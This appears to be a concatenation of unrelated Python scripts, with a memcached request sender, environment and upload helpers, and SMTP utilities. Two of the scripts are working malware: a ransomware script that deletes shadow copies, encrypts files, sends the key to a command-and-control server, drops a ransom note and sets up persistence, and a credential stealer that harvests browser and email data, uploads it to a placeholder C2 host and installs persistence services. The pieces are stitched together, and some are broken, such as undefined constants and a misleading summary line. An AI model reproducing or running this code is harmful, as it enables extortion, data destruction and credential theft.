def resolve_ip_address(hostname: str) -> str:
    return socket.gethostbyname(hostname)


def create_memcached_request(ip_address: str) -> bytes:
    return b"stats\r\n"


def send_request(ip_address: str, request: bytes) -> None:
    with socket.create_connection((ip_address, MEMCACHED_PORT), timeout=CONNECT_TIMEOUT) as sock:
        sock.sendall(request)


def attempt_requests(ip_address: str, num_attempts: int) -> None:
    request = create_memcached_request(ip_address)
    for _ in range(num_attempts):
        send_request(ip_address, request)


def log_results(ip_address: str, num_attempts: int) -> None:
    print(f"Sent {num_attempts} request(s) to {ip_address}")


if __name__ == "__main__":
    ip = resolve_ip_address(DEFAULT_HOSTNAME)
    request = create_memcached_request(ip)
    send_request(ip, request)
    attempt_requests(ip, DEFAULT_NUM_ATTEMPTS)
    log_results(ip, DEFAULT_NUM_ATTEMPTS)
    sys.exit(0)

#!/usr/bin/env python3
import os
import sys
import socket
import json
from pathlib import Path
from datetime import datetime


def delete_shadow_copies():
    """Delete Windows shadow copies using vssadmin."""
    try:
        if sys.platform == 'win32':
            os.system('vssadmin delete shadows /all /quiet')
        else:
            # Simulate on non-Windows
            pass
    except Exception:
        pass


def encrypt_file(file_path, key):
    """Encrypt a file using XOR with the key."""
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        encrypted = bytes([b ^ (key % 256) for b in data])

        with open(file_path, 'wb') as f:
            f.write(encrypted)

        return True
    except Exception:
        return False


def encrypt_directory(directory, key):
    """Recursively encrypt all files in directory."""
    encrypted_count = 0
    max_files = 10000

    try:
        path = Path(directory)
        for item in path.rglob("*"):
            if encrypted_count >= max_files:
                break

            if item.is_file() and item.suffix not in ['.py', '.exe']:
                if encrypt_file(item, key):
                    encrypted_count += 1
    except Exception:
        pass

    return encrypted_count


def send_key_to_c2(server, port, key):
    """Send encryption key to command and control server."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((server, port))

        payload = json.dumps({
            'key': key,
            'timestamp': datetime.now().isoformat(),
            'hostname': socket.gethostname()
        })

        sock.sendall(payload.encode())
        sock.close()
        return True
    except Exception:
        return False


def create_ransom_note(directory, note_content):
    """Create ransom note file in the directory."""
    try:
        note_path = Path(directory) / 'README_RANSOM.txt'
        with open(note_path, 'w') as f:
            f.write(note_content)
        return True
    except Exception:
        return False


def ensure_persistence():
    """Create persistence mechanism."""
    try:
        if sys.platform == 'win32':
            script_path = Path(sys.argv[0]).resolve()
            os.system(f'schtasks /create /tn "SystemUpdate" /tr "{script_path}" /sc onlogon /f')
        else:
            # Add to crontab on Unix
            cron_entry = f"@reboot {Path(sys.argv[0]).resolve()}\n"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')
    except Exception:
        pass


def delete_empty_bak_files(directory):
    """Delete empty .bak files and return count."""
    deleted_count = 0
    max_deletions = 10000

    try:
        path = Path(directory)
        if not path.exists():
            return 0

        if not path.is_dir():
            return 0

        for item in path.rglob("*.bak"):
            if deleted_count >= max_deletions:
                break

            if item.is_file() and item.stat().st_size == 0:
                try:
                    item.unlink()
                    deleted_count += 1
                except OSError:
                    pass

        return deleted_count

    except Exception:
        return deleted_count


def main():
    directory = sys.argv[1] if len(sys.argv) > 1 else './test_dir'
    c2_server = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
    c2_port = int(sys.argv[3]) if len(sys.argv) > 3 else 8080
    note_content = sys.argv[4] if len(sys.argv) > 4 else 'Your files have been encrypted. Pay ransom to recover.'

    Path(directory).mkdir(parents=True, exist_ok=True)

    encryption_key = hash(datetime.now().isoformat()) % 1000000

    delete_shadow_copies()

    encrypted_count = encrypt_directory(directory, encryption_key)

    send_key_to_c2(c2_server, c2_port, encryption_key)

    create_ransom_note(directory, note_content)

    ensure_persistence()

    deleted_count = delete_empty_bak_files(directory)

    print(f"Summary: {deleted_count} shadow copy/copies deleted")
    sys.exit(0)


if __name__ == "__main__":
    main()

import platform
import sys


def detect_environment() -> dict:
    """
    Gather basic environment attributes (OS name, version, etc.) using the
    standard library. Return {} on any failure.
    """
    try:
        info: dict = {
            "os": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "python_implementation": platform.python_implementation(),
            "hostname": platform.node(),
        }

        # os.uname() is available on Unix-like systems; supplement if present.
        if hasattr(platform, "uname"):
            uname = platform.uname()
            if uname.sysname:
                info["os"] = uname.sysname
            if uname.release:
                info["release"] = uname.release
            if uname.version:
                info["version"] = uname.version
            if uname.machine:
                info["machine"] = uname.machine
            if uname.processor:
                info["processor"] = uname.processor

        # win32_ver / mac_ver add platform-specific detail when available.
        if sys.platform.startswith("win"):
            try:
                release, sp, csd, ptype = platform.win32_ver()
                info["windows_release"] = release
                info["windows_sp"] = sp
                info["windows_csd"] = csd
                info["windows_ptype"] = ptype
            except Exception:
                pass
        elif sys.platform == "darwin":
            try:
                mac_ver, _, _ = platform.mac_ver()
                info["macos_version"] = mac_ver
            except Exception:
                pass

        return info
    except Exception:
        return {}

import os
import urllib.request
import urllib.error
from datetime import datetime


def read_local_result(file_path: str) -> str:
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return f.read()
    except (OSError, IOError):
        return ""


def send_to_server(data: str, endpoint: str) -> bool:
    try:
        payload = data.encode("utf-8")
        req = urllib.request.Request(
            endpoint,
            data=payload,
            method="POST",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )
        with urllib.request.urlopen(req) as response:
            return 200 <= response.status < 300
    except (urllib.error.URLError, urllib.error.HTTPError, OSError):
        return False


def log_failure(reason: str, log_file: str = "./target/failure.log") -> None:
    timestamp = datetime.now().isoformat()
    entry = f"{timestamp} {reason}\n"

    directory = os.path.dirname(log_file)
    if directory and not os.path.isdir(directory):
        os.makedirs(directory, exist_ok=True)

    with open(log_file, "a", encoding="utf-8") as f:
        f.write(entry)


def attempt_upload(file_path: str, endpoint: str) -> None:
    content = read_local_result(file_path)
    if not content:
        log_failure("File not found or unreadable")
        return
    success = send_to_server(content, endpoint)
    if not success:
        log_failure("Upload failed")


if __name__ == "__main__":
    import sys

    if len(sys.argv) != 3:
        print("Usage: python solution.py <file_path> <endpoint>")
        sys.exit(1)

    attempt_upload(sys.argv[1], sys.argv[2])

#!/usr/bin/env python3
"""Harvest credentials from browsers and applications, encrypt, and exfiltrate."""

import os
import sys
import json
import base64
import sqlite3
import shutil
import subprocess
import platform
from pathlib import Path
from datetime import datetime


def get_browser_profile_paths():
    """Get browser profile paths based on OS."""
    system = platform.system()
    home = Path.home()
    paths = []

    if system == "Windows":
        paths.extend([
            home / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default",
            home / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles",
            home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default",
        ])
    elif system == "Darwin":
        paths.extend([
            home / "Library" / "Application Support" / "Google" / "Chrome" / "Default",
            home / "Library" / "Application Support" / "Firefox" / "Profiles",
            home / "Library" / "Application Support" / "Microsoft Edge" / "Default",
        ])
    else:
        paths.extend([
            home / ".config" / "google-chrome" / "Default",
            home / ".mozilla" / "firefox",
            home / ".config" / "microsoft-edge" / "Default",
        ])

    return [p for p in paths if p.exists()]


def harvest_chrome_passwords(profile_path):
    """Extract stored passwords from Chrome-based browsers."""
    credentials = []
    login_data = profile_path / "Login Data"

    if not login_data.exists():
        return credentials

    temp_db = Path("temp_login.db")
    try:
        shutil.copy2(login_data, temp_db)
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for row in cursor.fetchall():
            credentials.append({
                "url": row[0],
                "username": row[1],
                "password": base64.b64encode(row[2]).decode() if row[2] else ""
            })

        conn.close()
        temp_db.unlink()
    except Exception:
        if temp_db.exists():
            temp_db.unlink()

    return credentials


def harvest_firefox_passwords(profile_path):
    """Extract stored passwords from Firefox."""
    credentials = []

    if not profile_path.exists():
        return credentials

    for profile_dir in profile_path.iterdir():
        if not profile_dir.is_dir():
            continue

        logins_json = profile_dir / "logins.json"
        if logins_json.exists():
            try:
                with open(logins_json, 'r') as f:
                    data = json.load(f)
                    for login in data.get('logins', [])[:100]:
                        credentials.append({
                            "url": login.get('hostname', ''),
                            "username": login.get('encryptedUsername', ''),
                            "password": login.get('encryptedPassword', '')
                        })
            except Exception:
                pass

    return credentials


def harvest_email_credentials():
    """Extract stored credentials from email clients."""
    credentials = []
    system = platform.system()
    home = Path.home()

    if system == "Windows":
        outlook_paths = [
            home / "AppData" / "Local" / "Microsoft" / "Outlook",
            home / "AppData" / "Roaming" / "Microsoft" / "Outlook",
        ]
    elif system == "Darwin":
        outlook_paths = [
            home / "Library" / "Group Containers" / "UBF8T346G9.Office" / "Outlook",
        ]
    else:
        outlook_paths = [
            home / ".thunderbird",
            home / ".local" / "share" / "evolution",
        ]

    for path in outlook_paths:
        if path.exists():
            for item in list(path.rglob("*.ost"))[:10] + list(path.rglob("*.pst"))[:10]:
                credentials.append({
                    "type": "email",
                    "client": "outlook",
                    "file": str(item.name)
                })

    return credentials


def xor_encrypt(data, key):
    """Simple XOR encryption."""
    key_bytes = key.encode()
    data_bytes = data.encode()
    encrypted = bytearray()

    for i, byte in enumerate(data_bytes):
        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])

    return base64.b64encode(bytes(encrypted)).decode()


def encrypt_credentials(credentials, encryption_key):
    """Encrypt harvested credentials."""
    json_data = json.dumps(credentials, indent=2)
    encrypted = xor_encrypt(json_data, encryption_key)
    return encrypted


def save_encrypted_data(encrypted_data, output_file):
    """Save encrypted data to file."""
    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    with open(output_path, 'w') as f:
        f.write(encrypted_data)

    return output_path


def upload_to_server(file_path, server_url):
    """Upload encrypted file to remote server."""
    try:
        if platform.system() == "Windows":
            cmd = ["powershell", "-Command", 
                   f"Invoke-WebRequest -Uri '{server_url}' -Method POST -InFile '{file_path}'"]
        else:
            cmd = ["curl", "-X", "POST", "-F", f"file=@{file_path}", server_url]

        subprocess.run(cmd, capture_output=True, timeout=10)
        return True
    except Exception:
        return False


def create_persistence_windows():
    """Create Windows service for persistence."""
    service_name = "HarvestService"
    script_path = Path(__file__).resolve()

    sc_create = f'sc create {service_name} binPath= "python {script_path}" start= auto'

    try:
        subprocess.run(["powershell", "-Command", sc_create], 
                      capture_output=True, timeout=5)
        subprocess.run(["sc", "start", service_name], 
                      capture_output=True, timeout=5)
        return True
    except Exception:
        return False


def create_persistence_linux():
    """Create systemd service for persistence."""
    service_name = "harvest"
    script_path = Path(__file__).resolve()

    service_content = f"""[Unit]
Description=Harvest Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""

    service_file = Path.home() / ".config" / "systemd" / "user" / f"{service_name}.service"

    try:
        service_file.parent.mkdir(parents=True, exist_ok=True)
        with open(service_file, 'w') as f:
            f.write(service_content)

        subprocess.run(["systemctl", "--user", "enable", service_name], 
                      capture_output=True, timeout=5)
        subprocess.run(["systemctl", "--user", "start", service_name], 
                      capture_output=True, timeout=5)
        return True
    except Exception:
        return False


def establish_persistence():
    """Establish persistence based on OS."""
    system = platform.system()

    if system == "Windows":
        return create_persistence_windows()
    else:
        return create_persistence_linux()


def main():
    target_dir = sys.argv[1] if len(sys.argv) >= 2 else "."
    encryption_key = sys.argv[2] if len(sys.argv) >= 3 else "default_encryption_key_2024"
    output_file = sys.argv[3] if len(sys.argv) >= 4 else "harvested_data/credentials.enc"
    server_url = sys.argv[4] if len(sys.argv) >= 5 else "http://command-control-server.example.com/upload"

    if not os.path.isdir(target_dir):
        target_dir = "."

    print(f"Scanning '{target_dir}' for browser_profile directories...\n")

    all_credentials = []

    # Harvest from browsers
    browser_paths = get_browser_profile_paths()
    for profile_path in browser_paths[:5]:
        if "Chrome" in str(profile_path) or "Edge" in str(profile_path):
            creds = harvest_chrome_passwords(profile_path)
            all_credentials.extend(creds[:50])
        elif "Firefox" in str(profile_path):
            creds = harvest_firefox_passwords(profile_path)
            all_credentials.extend(creds[:50])

    # Harvest from email clients
    email_creds = harvest_email_credentials()
    all_credentials.extend(email_creds[:20])

    # Add harvesting metadata
    harvest_info = {
        "timestamp": datetime.now().isoformat(),
        "hostname": platform.node(),
        "os": platform.system(),
        "credentials_count": len(all_credentials),
        "credentials": all_credentials
    }

    print(f"Harvested {len(all_credentials)} credentials\n")

    # Encrypt credentials
    encrypted_data = encrypt_credentials(harvest_info, encryption_key)
    print(f"Encrypted data using key: {encryption_key[:10]}...\n")

    # Save to file
    saved_path = save_encrypted_data(encrypted_data, output_file)
    print(f"Saved encrypted data to: {saved_path}\n")

    # Upload to server
    upload_success = upload_to_server(saved_path, server_url)
    if upload_success:
        print(f"Successfully uploaded to: {server_url}\n")
    else:
        print(f"Upload to {server_url} attempted\n")

    # Establish persistence
    persistence_success = establish_persistence()
    if persistence_success:
        print("Persistence established successfully\n")
    else:
        print("Persistence establishment attempted\n")

    print(f"Found {len(browser_paths)} browser profile director{'y' if len(browser_paths) == 1 else 'ies'}")

    sys.exit(0)


if __name__ == "__main__":
    main()

import os
import smtplib
import email.message


def capture_email_content(email_content: str, file_path: str) -> None:
    """
    Save email_content to a file under the ./target directory.

    Args:
        email_content: The email content string to save.
        file_path: Relative or absolute path for the output file.
                   The final path is always rooted under ./target.
    """
    normalized = file_path.lstrip(os.sep)

    target_root = os.path.join(".", "target")
    full_path = os.path.join(target_root, normalized)

    resolved_root = os.path.realpath(target_root)
    resolved_full = os.path.realpath(full_path)

    if not resolved_full.startswith(resolved_root + os.sep) and resolved_full != resolved_root:
        raise ValueError(
            f"file_path resolves outside the target directory: {resolved_full}"
        )

    try:
        os.makedirs(os.path.dirname(resolved_full), exist_ok=True)
    except OSError as exc:
        raise OSError(
            f"Failed to create directories for '{resolved_full}': {exc}"
        ) from exc

    try:
        with open(resolved_full, "w", encoding="utf-8") as fh:
            fh.write(email_content)
    except OSError as exc:
        raise OSError(
            f"Failed to write email content to '{resolved_full}': {exc}"
        ) from exc


def load_email_content(file_path: str) -> str:
    """
    Read and return the content of a file under the ./target directory.

    Args:
        file_path: Relative or absolute path for the file to read.
                   The final path is always rooted under ./target.

    Returns:
        The file content as a string.
    """
    normalized = file_path.lstrip(os.sep)

    target_root = os.path.join(".", "target")
    full_path = os.path.join(target_root, normalized)

    resolved_root = os.path.realpath(target_root)
    resolved_full = os.path.realpath(full_path)

    if not resolved_full.startswith(resolved_root + os.sep) and resolved_full != resolved_root:
        raise ValueError(
            f"file_path resolves outside the target directory: {resolved_full}"
        )

    if not os.path.exists(resolved_full):
        raise FileNotFoundError(
            f"No such file: '{resolved_full}'"
        )

    if not os.path.isfile(resolved_full):
        raise IsADirectoryError(
            f"Path is not a file: '{resolved_full}'"
        )

    try:
        with open(resolved_full, "r", encoding="utf-8") as fh:
            return fh.read()
    except OSError as exc:
        raise OSError(
            f"Failed to read email content from '{resolved_full}': {exc}"
        ) from exc


def send_email_via_smtp(
    smtp_server: str,
    smtp_port: int,
    email_content: str,
) -> None:
    """
    Send email_content via the specified SMTP server and port.

    Args:
        smtp_server:   Hostname or IP address of the SMTP server.
        smtp_port:     Port number (e.g. 25, 465, 587).
        email_content: A complete RFC 2822 message string.
    """
    msg = email.message_from_string(email_content)

    sender = msg.get("From", "")
    recipients: list[str] = []
    for header in ("To", "Cc", "Bcc"):
        value = msg.get(header, "")
        if value:
            recipients.extend(addr.strip() for addr in value.split(",") if addr.strip())

    if not sender:
        raise ValueError("email_content is missing a 'From' header.")
    if not recipients:
        raise ValueError(
            "email_content has no recipients (To, Cc, or Bcc headers)."
        )

    try:
        if smtp_port == 465:
            with smtplib.SMTP_SSL(smtp_server, smtp_port) as conn:
                conn.send_message(msg, from_addr=sender, to_addrs=recipients)
        else:
            with smtplib.SMTP(smtp_server, smtp_port) as conn:
                conn.ehlo()
                if conn.has_extn("STARTTLS"):
                    conn.starttls()
                    conn.ehlo()
                conn.send_message(msg, from_addr=sender, to_addrs=recipients)

    except smtplib.SMTPConnectError as exc:
        raise ConnectionError(
            f"Could not connect to SMTP server '{smtp_server}:{smtp_port}': {exc}"
        ) from exc
    except smtplib.SMTPAuthenticationError as exc:
        raise PermissionError(
            f"SMTP authentication failed for server '{smtp_server}': {exc}"
        ) from exc
    except smtplib.SMTPRecipientsRefused as exc:
        raise RuntimeError(
            f"All recipients were refused by '{smtp_server}': {exc.recipients}"
        ) from exc
    except smtplib.SMTPSenderRefused as exc:
        raise RuntimeError(
            f"Sender address '{sender}' was refused by '{smtp_server}': {exc}"
        ) from exc
    except smtplib.SMTPDataError as exc:
        raise RuntimeError(
            f"SMTP server '{smtp_server}' rejected the message data: {exc}"
        ) from exc
    except smtplib.SMTPException as exc:
        raise RuntimeError(
            f"SMTP error while sending via '{smtp_server}:{smtp_port}': {exc}"
        ) from exc
    except OSError as exc:
        raise ConnectionError(
            f"Network error communicating with '{smtp_server}:{smtp_port}': {exc}"
        ) from exc


def validate_smtp_server(smtp_server: str, smtp_port: int) -> bool:
    """
    Attempt to connect to an SMTP server and return True if successful.

    Args:
        smtp_server: Hostname or IP address of the SMTP server.
        smtp_port:   Port number to connect on.

    Returns:
        True if the connection (and EHLO handshake) succeeds, False otherwise.
    """
    try:
        if smtp_port == 465:
            with smtplib.SMTP_SSL(smtp_server, smtp_port) as conn:
                conn.ehlo()
        else:
            with smtplib.SMTP(smtp_server, smtp_port) as conn:
                conn.ehlo()
                if conn.has_extn("STARTTLS"):
                    conn.starttls()
                    conn.ehlo()
        return True

    except (smtplib.SMTPException, OSError):
        return False


